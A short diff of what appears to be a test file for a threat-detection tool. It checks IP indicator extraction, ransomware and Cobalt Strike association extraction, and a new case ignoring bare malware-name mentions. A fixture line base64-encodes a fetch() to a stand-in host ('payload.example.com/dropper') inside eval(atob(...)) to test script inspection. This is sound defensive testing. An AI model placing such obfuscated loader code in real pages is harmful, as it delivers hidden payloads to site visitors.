@@ -25,6 +25,7 @@ assert(!extractIndicators('999.1.1.1').ips.includes('999.1.1.1'), 'rejects impos
 const associations = extractThreatAssociations('Tool output: campaign associated with LockBit ransomware and Cobalt Strike beacons.', 'tool_context')
 assert(associations.some(item => item.name === 'LockBit' && item.confidence === 'high'), 'extracts high-confidence ransomware context')
 assert(associations.some(item => item.name === 'Cobalt Strike'), 'extracts tool context')
+assert.equal(extractThreatAssociations('Article title: Vidar (26) woke up with a new name.', 'tool_context').length, 0, 'ignores bare provider-page name mentions')
 
 const encoded = Buffer.from('fetch("https://payload.example.com/dropper"); document.write("stage");').toString('base64')
 const script = inspectScript({ src: '', inline: `eval(atob("${encoded}"));` }, 0)
